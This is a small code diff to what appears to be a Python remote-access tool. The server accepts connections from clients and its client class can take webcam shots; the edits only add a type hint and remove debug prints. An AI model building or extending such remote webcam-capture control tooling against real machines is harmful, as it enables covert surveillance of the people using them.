@@ -96,6 +96,7 @@ def _time() -> str:
     # returns str
     return str(datetime.now()).replace(':','-')
 
+
 def json_dumps(data) -> bytes:
     """ Dump json data and encode it """
     return json.dumps(data).encode()
@@ -298,7 +299,7 @@ class Client(object):
             f.write(data)
         return True, save_as
 
-    def webcam(self, save_as=None) -> bool:
+    def webcam(self, save_as=None) -> (bool, str):
         """ Take a webcam shot """
         # returns True/False, save_as/None
         if not save_as:
@@ -427,7 +428,6 @@ class MultiServer(object):
         while 1:
             try:
                 conn, address = self.socket.accept()
-                print('Accepted Connection')
                 conn.setblocking(1)
 
                 hostname = conn.recv(4096).decode()
@@ -435,7 +435,6 @@ class MultiServer(object):
 
                 client = Client(conn, address, self.key)
                 self.clients.append(client)
-                print(self.clients)
                 if _print:
                     msg = 'Connection has been established: {0} ({1})'.format(address[0], address[-1])
                     print('\n{0}\n{1}\n{0}'.format('-' * len(msg), msg))
